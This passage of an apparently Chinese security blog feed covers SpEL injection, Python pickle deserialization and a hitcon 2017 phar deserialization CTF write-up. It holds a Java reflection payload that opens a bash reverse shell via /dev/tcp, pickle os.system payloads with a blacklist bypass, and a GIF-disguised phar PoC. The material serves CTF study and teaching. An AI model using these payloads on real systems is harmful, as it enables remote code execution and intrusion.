class="string">"C:\\Windows\\System32\\calc.exe"</span>&#125;);</span><br></pre></td></tr></table></figure></li><li><p>那么 RCE 就可以写成反弹 shell 的形式 : </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,<span class="string">""</span>.getClass()).invoke((<span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">null</span>)), <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做题目遇到了，就去查了一些这方面的资料，总结一下。&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
      <category term="SpEL" scheme="http://yoursite.com/tags/SpEL/"/>
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python 序列化与反序列化</title>
    <link href="http://yoursite.com/2019/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2019/09/10/python反序列化/</id>
    <published>2019-09-10T07:57:15.022Z</published>
    <updated>2019-09-10T07:56:47.567Z</updated>
    
    <content type="html"><![CDATA[<p>关于 python 序列化与反序列化的一些基础知识，有待补充</p><a id="more"></a><h1 id="python-序列化与反序列化"><a href="#python-序列化与反序列化" class="headerlink" title="python 序列化与反序列化"></a>python 序列化与反序列化</h1><ul><li><p>python 提供两个模块来实现反序列化，即 <code>cPickle</code> 和 <code>pickle</code> ，这两个模块功能是相同的，区别在于 <code>cPickle</code> 是 C 语言写的，<code>pickle</code> 是纯 Python 写的</p></li><li><p>写一个 <code>Person</code> 类并生成一个 <code>admin</code> 的实例化对象测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3.7.3</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">self.username = username</span><br><span class="line">self.password = password</span><br><span class="line"></span><br><span class="line">admin = Person(<span class="string">'admin'</span>,<span class="string">'admin123'</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>pickle.dumps()</code> 方法将对象序列化为 <code>byte</code> 对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = pickle.dumps(admin)</span><br><span class="line"><span class="comment"># b'\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&#125;q\x02(X\x08\x00\x00\x00usernameq\x03X\x05\x00\x00\x00adminq\x04X\x08\x00\x00\x00passwordq\x05X\x08\x00\x00\x00admin123q\x06ub.'</span></span><br></pre></td></tr></table></figure></li><li><p><code>pickle.loads()</code> 将 <code>byte</code> 对象反序列化出对象，这个函数有个特性，就是<strong>对于未导入的库会尝试自动 <code>import</code></strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uns = pickle.loads(s)</span><br><span class="line"><span class="comment"># &lt;__main__.Person object at 0x00000229997E5780&gt;</span></span><br><span class="line"></span><br><span class="line">dir(uns)</span><br><span class="line"><span class="comment"># ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slotnames__', '__str__', '__subclasshook__', '__weakref__', 'password', 'username']</span></span><br><span class="line"></span><br><span class="line">uns.username</span><br><span class="line"><span class="comment"># 'admin'</span></span><br><span class="line">uns.password</span><br><span class="line"><span class="comment"># 'admin123'</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>当一个类的实例对象被反序列化时，它的 <code>__init__()</code>  方法不会被调用，默认的方式是创建一个没有初始化的对象然后恢复它的属性。</li></ul><h1 id="RestrictedUnpickler-类优化反序列化"><a href="#RestrictedUnpickler-类优化反序列化" class="headerlink" title="RestrictedUnpickler 类优化反序列化"></a>RestrictedUnpickler 类优化反序列化</h1><ul><li><p>在 pickle 文档开头有如下一句话</p><blockquote><p>Never unpickle data received from an untrusted<br>or unauthenticated source.</p></blockquote></li><li><p>考虑如下代码，这会导致系统命令 <code>echo</code> 的执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b"cos\nsystem\n(S'echo peri0d'\ntR."</span>)</span><br><span class="line"><span class="comment"># peri0d</span></span><br><span class="line"><span class="comment"># 0</span></span><br></pre></td></tr></table></figure></li><li><p>文档给出的解决方案是在 <code>Unpickler.find_class()</code> 里面设置黑白名单检测，只能执行内置函数并且函数不在黑名单中，示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">black_builtins = &#123;</span><br><span class="line"><span class="string">'eval'</span>,</span><br><span class="line"><span class="string">'exec'</span>,</span><br><span class="line"><span class="string">'execfile'</span>,</span><br><span class="line"><span class="string">'compile'</span>,</span><br><span class="line"><span class="string">'open'</span>,</span><br><span class="line"><span class="string">'input'</span>,</span><br><span class="line"><span class="string">'__import__'</span>,</span><br><span class="line"><span class="string">'exit'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResRestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, moudle, name)</span>:</span></span><br><span class="line"><span class="keyword">if</span> moudle == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> black_builtins:</span><br><span class="line">            <span class="comment"># getattr 用于获取某个对象的属性值</span></span><br><span class="line"><span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (moudle, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="comment"># BytesIO 用于在内存中读写数据，操作的对象是 byte 类型，对应了 pickle 序列化之后的类型</span></span><br><span class="line"><span class="keyword">return</span> ResRestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure></li><li><p>做个测试，<code>print(restricted_loads(b&#39;\x80\x03]q\x00(K\x01K\x02K\x03K\x04X\x04\x00\x00\x000x10q\x01e.&#39;))</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/python/python_2.png" alt></p></li><li><p>第二个，<code>print(restricted_loads(b&quot;cos\nsystem\n(S&#39;echo hello world&#39;\ntR.&quot;))</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/python/python_3.png" alt></p></li><li><p>第三个， <code>print(restricted_loads((b&#39;cbuiltins\neval\n&#39;b&#39;(S\&#39;getattr(__import__(&quot;os&quot;), &quot;system&quot;)&#39;b&#39;(&quot;echo hello world&quot;)\&#39;\ntR.&#39;)))</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/python/python_4.png" alt></p></li></ul><h1 id="python-反序列化漏洞"><a href="#python-反序列化漏洞" class="headerlink" title="python 反序列化漏洞"></a>python 反序列化漏洞</h1><ul><li><p>所谓反序列化漏洞，就是在序列化的过程中，类的一些魔术方法一起被序列化，而在反序列化时，这些函数就会执行，通过构造相应的 POP 链实现不同的攻击</p></li><li><p>示例如下，关键点在于 <code>__reduce__()</code> 方法，当对象被序列化时就会被调用，它返回一个代表全局名称的字符串或者一个元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">self.username = username</span><br><span class="line">self.password = password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (os.system,(<span class="string">'whoami'</span>,))</span><br><span class="line"></span><br><span class="line">admin = Person(<span class="string">'admin'</span>,<span class="string">'admin123'</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span></span><br><span class="line">uns = pickle.loads(s)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>返回字符串 : 查找字符串对应名字的对象，将其序列化之后返回</p></li><li><p>返回元组 : 元组中第一个参数为<strong>可调用的对象</strong>，第二个元素是<strong>该对象所需要的参数元组</strong></p></li></ul><h1 id="python3-7-内置函数"><a href="#python3-7-内置函数" class="headerlink" title="python3.7 内置函数"></a>python3.7 内置函数</h1><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/python/python_1.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于 python 序列化与反序列化的一些基础知识，有待补充&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="pickle" scheme="http://yoursite.com/tags/pickle/"/>
    
  </entry>
  
  <entry>
    <title>phar 反序列化小结</title>
    <link href="http://yoursite.com/2019/08/22/phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
    <id>http://yoursite.com/2019/08/22/phar 反序列化小结/</id>
    <published>2019-08-22T07:09:02.156Z</published>
    <updated>2019-08-29T06:51:52.443Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>初次接触 phar 反序列化，看到 ph 牛圈子以前以本题为例讨论过这个知识点，学习一下</p></blockquote><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li><a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">http://117.50.3.97:8005/</a></li><li>hitcon2017 的 baby^h-master-php-2017</li><li><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">Dockerfile</a></li></ul><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><ul><li><p>判断 cookie 中是否含有 <code>session-data</code> ，没有就赋值为 <code>$data-----$hmac</code>，其中 <code>$data</code> 为 <code>User</code> 类序列化后的字符串， <code>$hmac</code> 为 <code>$data</code> 以 <code>$SECRET</code> 为密钥，进行 sha1 加密后的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span>.md5(<span class="string">"orange"</span>.$_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">    $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET); </span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac)); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>有个 check_session 函数，获取 <code>session-data</code> 中的  <code>$data</code> 和 <code>$hmac</code>，并进行三次判断</p><ol><li><code>$data</code> 和 <code>$hmac</code> 必须存在且均为字符串</li><li><code>hash_hmac(&quot;sha1&quot;, $data, $SECRET)</code> 必须和 <code>$hmac</code> 相等</li><li><code>$data</code> 反序列化后的结果必须含有 <code>avatar</code> 属性，这个 <code>avatar</code> 是一个路径。最终函数返回 <code>avatar</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET; </span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>]; </span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>); </span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) ) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>); </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) ) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>); </span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取 get 的参数赋值给 <code>$mode</code> ，如果 <code>$mode</code> 为 <code>upload</code> 则调用 <code>upload(check_session())</code>。这一段的意思就是获取主目录下的 <code>avatar.gif</code> 复制到 <code>$SANDBOX</code> 目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">"url"</span>].<span class="string">"/avatar.gif"</span>);</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">    file_put_contents($path.<span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload OK"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果 <code>$mode</code> 为 <code>show</code> 则调用 <code>show(check_session())</code>。将目录下的 <code>avatar.gif</code> 输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($path.<span class="string">"/avatar.gif"</span>) )</span><br><span class="line">        $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path.<span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>题目还给了一段代码，这里是可以通过反序列化构造出 Admin 对象然后触发析构函数，但是后面的 <code>hash_hmac</code> 函数无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span>.<span class="string">"  global \$FLAG; \$FLAG();"</span>.<span class="string">"&#125;"</span>);</span><br><span class="line">        $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h1><ul><li><p>phar 提供了将多个 php 文件合成一个 phar 文件的功能，类似于 java 中的 jar</p></li><li><p>php 在解析 phar 文件的 Metadata 时可能会触发反序列化操作</p></li><li><p>phar 会默认注册 phar:// 协议，在用 phar:// 协议读取文件的时候会自动解析成 phar 对象，同时反序列化其中存储的 Metadata 信息</p></li><li><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 生成 test.phar 文件，并将 php.ini 中的 phar.readonly 改为 off</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>, <span class="number">0</span>, <span class="string">'test.phar'</span>);</span><br><span class="line"><span class="comment">// 将字符串写入到 test.php 中</span></span><br><span class="line">$p[<span class="string">'test.php'</span>] = <span class="string">'string'</span>;</span><br><span class="line"><span class="comment">// 向 phar 中写入 meta-data</span></span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> User());</span><br><span class="line"><span class="comment">// 可以理解为文件头的标识部分，前面内容不限，但是必须以 <span class="meta">&lt;?php</span> __HALT_COMPILER(); <span class="meta">?&gt;</span> 结尾，否则无法识别为 phar 文件</span></span><br><span class="line">$p-&gt;setStub(<span class="string">'xxxxx&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>本题 avatar.gif 的 poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar = <span class="string">'orz'</span>;  </span><br><span class="line">&#125; </span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span>.<span class="string">'/avatar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">'file.php'</span>] = <span class="string">'idlefire'</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span>.<span class="string">'/avatar.phar'</span>, <span class="keyword">__DIR__</span>.<span class="string">'/avatar.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="另外两个知识点"><a href="#另外两个知识点" class="headerlink" title="另外两个知识点"></a>另外两个知识点</h1><ul><li>构造好反序列化对象之后，可以进入 <code>__distruct()</code> 方法，其中执行了 <code>$_GET[&quot;lucky&quot;]();</code>，就相当于执行一个无参函数，本题的意思就是执行获取 flag 的函数</li><li>本题获取 flag 的函数是使用 create_function 创建，是一个匿名函数，无法使用 <code>get_defined_functions()</code> 获取函数名</li><li>匿名函数名字是 <code>\x00lambda_%d</code> 这个 <code>%d</code> 是一个 1 开始的递增数列，表示这是当前进程中第%d个匿名函数。</li><li>如果一个崭新的 PHP 进程，其第 1 个匿名函数就是 <code>\x00lambda_1</code>，所以只需要传入 <code>lucky=%00lambda_1</code> 即可。</li><li>但是实战中，因为有很多人做题，每个人访问一次网页，就会使 <code>%d</code> 加 1 ，所以我们并不知道自己访问时的这个 <code>%d</code> 是多少。</li><li>这就涉及到第三个考点，我们通过大量请求，使目标 Apache 难以同时处理这么多请求，所以以 Pre-fork 模式启动的 Apache 会启动新进程来处理这个请求。那么，新进程下 <code>%d</code> 就是以 1 重新开始的</li></ul><h1 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h1><ul><li><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a></li><li>将生成的 gif 放到 vps 里</li><li>然后构造 url : <code>?m=upload&amp;url=http://xxx.xxx.xxx.xxx</code> 将 文件上传</li><li>运行 Orange 的 fork 脚本</li><li>请求 <code>?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1</code> 得到 flag</li><li>这里再次上传时，<code>upload</code> 中的 <code>file_get_contents</code> 触发 phar 反序列化，执行 <code>$_GET[&quot;lucky&quot;]();</code> </li></ul><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>不必在意最后的 exp，只需要关注这些知识点即可。</p><ol><li>了解 phar 反序列化</li><li>类似 <code>$_GET[&quot;lucky&quot;]();</code> 的沙盒，使用  <code>get_defined_functions()</code> 获取函数名直接执行</li><li>匿名函数函数名</li></ol><h1 id="加深印象的-phar-反序列化操作"><a href="#加深印象的-phar-反序列化操作" class="headerlink" title="加深印象的 phar 反序列化操作"></a>加深印象的 phar 反序列化操作</h1><p>原文 : <a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/205943.html</a></p><h2 id="生成-phar-文件"><a href="#生成-phar-文件" class="headerlink" title="生成 phar 文件"></a>生成 phar 文件</h2><ul><li><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar_1.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObeject</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>, <span class="number">0</span>, <span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'xxxxx&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> TestObeject();</span><br><span class="line">$o-&gt;data = <span class="string">'peri0d'</span>;</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'text.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>执行完毕后会生成一个 <code>test.phar</code> 文件，其中的 <code>meta-data</code> 是以序列化的形式出现的。那么 php 函数在对 phar 文件进行解析时，就必伴随着反序列化的操作</p></li><li><p><code>xxxxx&lt;?php __HALT_COMPILER(); ?&gt;</code> 为 phar 文件首部，<code>meta-data</code> 序列化内容为 <code>O:11:&quot;TestObeject&quot;:1:{s:4:&quot;data&quot;;s:6:&quot;peri0d&quot;;}</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/phar_1.png" alt></p></li></ul><h2 id="测试-phar-反序列化漏洞"><a href="#测试-phar-反序列化漏洞" class="headerlink" title="测试 phar 反序列化漏洞"></a>测试 phar 反序列化漏洞</h2><ul><li><p>漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar_2.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObeject</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>输出结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxperi0d</span><br></pre></td></tr></table></figure></li></ul><h2 id="将-phar-伪造成其他格式的文件"><a href="#将-phar-伪造成其他格式的文件" class="headerlink" title="将 phar 伪造成其他格式的文件"></a>将 phar 伪造成其他格式的文件</h2><ul><li><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 